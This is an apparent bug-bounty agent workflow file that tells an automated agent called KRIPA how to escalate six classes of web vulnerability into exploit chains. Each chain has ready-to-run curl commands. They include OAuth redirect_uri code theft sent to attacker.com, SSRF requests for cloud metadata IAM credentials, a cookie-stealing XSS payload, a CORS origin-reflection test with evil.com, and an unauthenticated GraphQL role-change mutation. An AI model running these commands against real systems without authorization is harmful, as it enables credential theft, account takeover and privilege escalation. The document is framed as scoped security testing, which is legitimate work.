# Chain Builder Workflow — KRIPA

## Trigger
Activated when a finding verdict = **CHAIN REQUIRED** from the Conditionally-Valid table in `SKILL.md`.

## ⏱️ Time Box: 20 Minutes Hard Stop
**If chain isn't proven in 20 minutes → KILL. No extensions. No "almost there."**

---

## Workflow

### Step 1: Read Standalone Finding
```bash
# Extract the original finding details
grep 'FINDING_ID' /root/.openclaw/intel/ACTIVITY-LOG.jsonl | tail -1
```
- Note: bug class, endpoint, parameter, evidence provided
- Identify which row in the Conditionally-Valid table this matches
- This is Finding A. You need to prove Finding B.

### Step 2: Lookup Chain Table — Identify Required B

| Finding A | Chain to B | Result | Severity |
|---|---|---|---|
| Open redirect | OAuth redirect_uri theft | Account Takeover | Critical |
| SSRF DNS-only | Internal service data access | Internal Access | Medium |
| Self-XSS | CSRF to trigger on victim | Victim XSS | Medium |
| CORS wildcard | Credentialed request exfil | Data Exfiltration | High |
| Subdomain takeover | OAuth redirect at that subdomain | Account Takeover | Critical |
| GraphQL introspection | Auth bypass on mutation/node() | Privilege Escalation | High |

### Step 3: Test the Chain with Real Requests

> **Both A and B must have curl evidence. Screenshots don't count. "Could work" = KILL.**

---

#### Chain 1: Open Redirect → OAuth redirect_uri Theft → ATO (Critical)

**Goal:** Steal OAuth authorization codes by injecting the open redirect into `redirect_uri`.

```bash
# Step A: Confirm open redirect works
curl -sI "https://TARGET/redirect?url=https://attacker.com" | grep -i "location:"
# Expected: Location: https://attacker.com

# Step B: Locate OAuth authorization endpoint
curl -sI "https://TARGET/.well-known/openid-configuration" | grep authorization_endpoint
# Or try common paths: /oauth/authorize, /auth/authorize, /connect/authorize

# Step C: Inject open redirect as redirect_uri in OAuth flow
curl -sI "https://TARGET/oauth/authorize?client_id=CLIENT_ID&response_type=code&redirect_uri=https%3A%2F%2FTARGET%2Fredirect%3Furl%3Dhttps%3A%2F%2Fattacker.com&scope=openid" | grep -i "location:"
# If Location points to attacker.com with ?code= param → CHAIN CONFIRMED
```

**Chain confirmed if:** OAuth redirects to attacker.com with authorization code in URL.

**Testing notes:**
- Try URL-encoded and double-encoded redirect_uri
- Check if app validates redirect_uri against a whitelist (exact match vs. prefix match)
- If whitelist is strict and doesn't allow the open redirect endpoint → KILL

---

#### Chain 2: SSRF DNS-only → Internal Service Data Access → Internal Access (Medium)

**Goal:** Escalate from blind DNS callback to HTTP responses from internal services.

```bash
# Step A: Confirm DNS callback exists (already done in Finding A)
# Step B: Escalate to HTTP — try cloud metadata
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" | head -20
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head -20

# Step C: Try localhost services
curl -s "https://TARGET/fetch?url=http://127.0.0.1:80/" | head -20
curl -s "https://TARGET/fetch?url=http://127.0.0.1:8080/" | head -20
curl -s "https://TARGET/fetch?url=http://127.0.0.1:3000/api/" | head -20
curl -s "https://TARGET/fetch?url=http://127.0.0.1:6379/" | head -5  # Redis

# Step D: Try internal RFC-1918 ranges
curl -s "https://TARGET/fetch?url=http://10.0.0.1/" | head -20
curl -s "https://TARGET/fetch?url=http://192.168.1.1/" | head -20
```

**Chain confirmed if:** Any internal HTTP response body is returned (not just DNS).

**Testing notes:**
- If app blocks http:// but allows https:// or dict://, try protocol switching
- Cloud metadata endpoints: AWS=169.254.169.254, GCP=169.254.169.254/computeMetadata/v1/ (requires header), Azure=169.254.169.254/metadata/instance
- If only DNS resolves and no HTTP response returns → KILL

---

#### Chain 3: Self-XSS → CSRF Trigger on Victim → Victim XSS (Medium)

**Goal:** Use CSRF to set the XSS payload in a victim's context so it fires for them.

```bash
# Step A: Identify Self-XSS location (e.g., profile display name, bio field)
# Confirm XSS fires in your own session first:
curl -s "https://TARGET/api/profile" -X POST \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"<img src=x onerror=alert(document.cookie)>"}' | head -10

# Step B: Check if the profile update endpoint has CSRF protection
curl -s "https://TARGET/api/profile" -X POST \
  -H "Content-Type: application/json" \
  -d '{"displayName":"<img src=x onerror=alert(document.cookie)>"}' | head -10
# If no CSRF token required in request → CSRF possible

# Step C: Check how the payload is triggered (does viewing profile render it?)
curl -s "https://TARGET/users/VICTIM_USERNAME" | grep -i "displayname\|<img\|onerror"
# If XSS payload renders when OTHER users view the profile → CHAIN CONFIRMED
```

**Chain confirmed if:** (1) Profile update has no CSRF token AND (2) payload renders for other users viewing the profile.

**Testing notes:**
- SameSite=Strict cookies defeat CSRF — check Set-Cookie headers
- JSON Content-Type endpoints may not be CSRF-able from cross-origin without CORS bypass
- If SameSite cookies or CSRF tokens block the CSRF → KILL

---

#### Chain 4: CORS Wildcard → Credentialed Request Exfil → Data Exfiltration (High)

**Goal:** Prove that attacker.com can make credentialed cross-origin requests and receive sensitive data.

```bash
# Step A: Check CORS response with attacker origin
curl -sI "https://TARGET/api/sensitive-endpoint" \
  -H "Origin: https://attacker.com" | grep -i "access-control"
# Need: Access-Control-Allow-Origin: https://attacker.com (or *)
# Need: Access-Control-Allow-Credentials: true

# Step B: If ACAO is wildcard (*), credentials can't be sent by spec — KILL
# If ACAO reflects the origin dynamically, credentials CAN be sent — continue

# Step C: Simulate credentialed cross-origin request
curl -s "https://TARGET/api/sensitive-endpoint" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=VALID_SESSION_TOKEN" | head -20
# If sensitive data (PII, tokens, private data) returned → CHAIN CONFIRMED

# Step D: Verify reflection behavior
curl -sI "https://TARGET/api/sensitive-endpoint" \
  -H "Origin: https://evil.com" | grep -i "access-control-allow-origin"
# If it returns exactly "evil.com" → origin is reflected = exploitable
```

**Chain confirmed if:** ACAO reflects origin (not wildcard) AND ACAC=true AND sensitive data returned.

**Testing notes:**
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is invalid by spec and blocked by browsers → KILL if wildcard
- The endpoint must return something worth stealing (not just a 200 OK)
- If no sensitive data is accessible via the endpoint → downgrade or KILL

---

#### Chain 5: Subdomain Takeover → OAuth Redirect at That Subdomain → ATO (Critical)

**Goal:** Prove the takeable subdomain is whitelisted in OAuth redirect_uri, enabling code theft.

```bash
# Step A: Confirm subdomain is takeable (dangling CNAME)
dig sub.target.com CNAME
# Look for CNAME pointing to unclaimed service (e.g., *.github.io, *.s3.amazonaws.com)

# Step B: Check if subdomain is in OAuth redirect_uri whitelist
curl -sI "https://TARGET/oauth/authorize?client_id=CLIENT_ID&response_type=code&redirect_uri=https%3A%2F%2Fsub.target.com%2Fcallback&scope=openid" | grep -i "location:"
# If it redirects toward sub.target.com (not an error page) → whitelist match confirmed

# Step C: Check if subdomain shares cookie scope
curl -sI "https://TARGET" | grep -i "set-cookie" | grep -i "domain="
# If cookie domain=.target.com → cookies sent to sub.target.com automatically

# Step D: Claim the subdomain (if authorized in program scope)
# Then receive the OAuth code / session cookie at your controlled endpoint
```

**Chain confirmed if:** (1) Subdomain CNAME is dangling AND (2) OAuth whitelists it OR cookies are scoped to .target.com.

**Testing notes:**
- Some programs exclude subdomain takeover or require separate report — check scope
- Even without claiming, the CNAME + whitelist evidence is enough for report PoC
- If no OAuth flow exists and cookies use Secure+SameSite → KILL (non-cookied domain, hits Never-Submit #23)

---

#### Chain 6: GraphQL Introspection → Auth Bypass on mutation/node() → Privilege Escalation (High)

**Goal:** Use introspection to discover mutations or node() queries that lack auth checks.

```bash
# Step A: Confirm introspection works
curl -s "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | grep -c "name"
# If type names returned → introspection confirmed

# Step B: Extract all mutations
curl -s "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name,args{name,type{name,kind,ofType{name}}}}}}}"}' > /tmp/mutations.json
cat /tmp/mutations.json | python3 -m json.tool | grep -A5 '"name"'

# Step C: Test node() ID enumeration (Relay spec)
curl -s "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{node(id:\"VXNlcjox\"){... on User{id,email,role}}}"}' | head -20
# Try base64 encoded IDs: User:1, User:2, Admin:1, etc.
# echo -n "User:1" | base64 → VXNlcjox

# Step D: Test sensitive mutation without auth
curl -s "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUserRole(userId:\"2\",role:\"admin\"){id role}}"}' | head -20
# If role changes without auth → CHAIN CONFIRMED
```

**Chain confirmed if:** Introspection reveals mutation AND that mutation executes without proper authorization OR node() returns other users' data.

**Testing notes:**
- Try with no auth headers, then with a regular user token (not admin)
- Batch queries may bypass rate limiting: `[{query: "..."}, {query: "..."}]`
- If all mutations require valid auth → KILL

---

### Step 4: Evaluate Chain Result

**If chain B works:**
- Verdict: **PASS** with escalated severity from chain table
- Emit CHAIN_CONFIRMED log (see output format below)
- Include full reproduction steps for BOTH A and B
- Forward to VYASA with chain context

**If chain B fails or 20-min timer expires:**
- Verdict: **KILL**
- Emit CHAIN_FAILED log (see output format below)
- Do NOT forward to VYASA

---

## Output Format

### Chain Confirmed
```json
{"agent":"KRIPA","action":"CHAIN_CONFIRMED — [Finding_ID]","details":"Chain: [A] + [B] = [Result]. A evidence: [curl command + output]. B evidence: [curl command + output]. Escalated severity: [Critical|High|Medium]. Full repro: [numbered steps].","taskId":"TASK_ID","squad":"SQUAD"}
```

### Chain Failed
```json
{"agent":"KRIPA","action":"CHAIN_FAILED — [Finding_ID]","details":"Chain B ([description]) failed. Specific reason: [e.g. CSRF token present, wildcard CORS blocks credentials, OAuth rejects redirect_uri]. Finding KILLED. Time spent: [Xm].","taskId":"TASK_ID","squad":"SQUAD"}
```

### Chain Timed Out
```json
{"agent":"KRIPA","action":"CHAIN_KILLED — [Finding_ID]","details":"20-minute time box expired. Chain B ([description]) unproven. Finding KILLED. Do not forward to VYASA.","taskId":"TASK_ID","squad":"SQUAD"}
```

---

## Rules

- **20-minute hard stop.** No extensions. No exceptions.
- **Real requests only.** No "this could theoretically work."
- **Both A and B must have curl evidence.** Screenshots don't count.
- **If B requires conditions you can't create** (second OAuth app, specific whitelist config) → KILL.
- **One wrong = KILL.** Any single failure in the chain breaks the whole thing.
- **Severity comes from the chain table**, not from the standalone finding. Don't inflate or deflate.
